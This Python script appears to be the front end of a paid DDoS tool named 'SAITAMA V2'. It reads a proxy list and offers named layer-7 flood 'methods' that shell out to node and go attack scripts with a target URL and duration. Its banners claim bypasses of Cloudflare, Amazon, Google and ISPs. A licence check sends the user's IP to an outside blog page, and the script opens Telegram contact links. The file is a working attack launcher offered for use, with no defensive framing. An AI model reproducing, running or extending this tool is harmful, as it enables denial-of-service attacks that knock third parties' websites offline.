
#----[ DEC BY - DARK LMNx9 ]
#----[ JOIN - t.me/DARK_TEAM_LMNx9 ]

import subprocess
import httpx
import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate
os.system("xdg-open https://t.me/DARK_TEAM_LMNx9")
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.red_to_white, "WELCOME TO SAITAMA V2 | USER: ROOT | PLAN :: VVIP | Proxy: " + bots_str + " | HAPPY TO USE"))
    print("")
  
def layer7():
    clear()
    si()
    print(Colorate.Horizontal(Colors.red_to_white, ''' ---[ DEC BY - DARK LMNx9 ]---
    
░█▀▀▀█ ─█▀▀█ ▀█▀ ▀▀█▀▀ ─█▀▀█ ░█▀▄▀█ ─█▀▀█ 
─▀▀▀▄▄ ░█▄▄█ ░█─ ─░█── ░█▄▄█ ░█░█░█ ░█▄▄█ 
░█▄▄▄█ ░█─░█ ▄█▄ ─░█── ░█─░█ ░█──░█ ░█─░█
        
                LIST LAYER7 METHODS
          
            
!TLS - POWERFUL TLS METHOD BYPASS AMAZON GOOGLE CF ISP
!BYPASS - BYPASS ANY ISP WITH HIGH RPS SEND
!HTTPS - SEND ATTACK WITH HTTPS-FLOOD
!RAPID - SEND HIGH RPS FOR HTTP DDOS 
!BLACK - FUCKING WEBSITE UNTIL DOWN
!CRASH - LOW QUALITY WEBSITE ATTACK
!HENTAI - BYPASS CLOUDFLARE WEBSITE



HOW TO USE
TLS https://example.com 120         TLS URL TIME
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.red_to_white
   , "WELCOME TO SAITAMA V2l | USER: ROOT| PLAN :: VVIP | Proxy: " + bots_str + " | HAPPY TO USE"))
    print("")
    banner = '''
        ⠀⠀⠀⠀⠀⠀
░█▀▀▀█ ─█▀▀█ ▀█▀ ▀▀█▀▀ ─█▀▀█ ░█▀▄▀█ ─█▀▀█ 
─▀▀▀▄▄ ░█▄▄█ ░█─ ─░█── ░█▄▄█ ░█░█░█ ░█▄▄█ 
░█▄▄▄█ ░█─░█ ▄█▄ ─░█── ░█─░█ ░█──░█ ░█─░█

Type Layer7 To See Layer7 Methods⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.red_to_white, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.red_to_white, "root@saitamaV2#~"))
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()

        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node TLS.js {host} {time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "RAPID" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node RAPID.js {host} {time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BLACK" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BLACK.js {host} {time} 100 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');             
                
        elif "CRASH" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'go run CRASH.go {host} 9999 get {time} nil')

            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "HTTPS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node HTTPS.js {host} {time} 100 10 proxy.tx 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BYPASS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BYPASS.js {host} {time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
               
        elif "HENTAI" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node HENTAI.js {host} {time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');

        elif "help" in cnc:
            print(Colorate.Horizontal(Colors.red_to_white, ''' 
LAYER7 - SEE ALL LAYER7 METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def get_ip_address():
    result = subprocess.run(["curl", "-s", "ifconfig.me"], capture_output=True, text=True)
    return result.stdout.strip()

def apvdef():
    # Generate the key using the specific key and IP address
    ip_address = get_ip_address()
    key = "SAITAMA_V2-" + ip_address

    # Make the HTTP GET request and check if the key is in the response
    row = httpx.get("https://anonsecbd.blogspot.com/2024/05/saitama-v2-user.html").text
    if key in row:
        main()
    else:
        os.system("clear")
        print("""\033[36m
░█▀▀▀█ ─█▀▀█ ▀█▀ ▀▀█▀▀ ─█▀▀█ ░█▀▄▀█ ─█▀▀█ 
─▀▀▀▄▄ ░█▄▄█ ░█─ ─░█── ░█▄▄█ ░█░█░█ ░█▄▄█ 
░█▄▄▄█ ░█─░█ ▄█▄ ─░█── ░█─░█ ░█──░█ ░█─░█
                                   
             SCRIPT OWNER ANON SEC BD
             SPECIAL HELPED BY AF  """)
        print('----------------------------------------------------')
        print(' THE BOT NET IS PAID ')
        print(' FIRST YOU NEED TO APPROVED')
        print(" YOUR KEY >: " +key)
        print('----------------------------------------------------')
        print(' [1] Contact In Telegram ')
        print(' https://t.me/SAITAMA_C2')
        print('----------------------------------------------------')
        opt=input(' Choose Option>: ')
        if opt in ['1']:
         os.system("xdg-open https://t.me/SAITAMA_C2")
        elif opt in ['2']:
         os.system("")
        sys.exit()

if __name__ == "__main__":
    apvdef()
    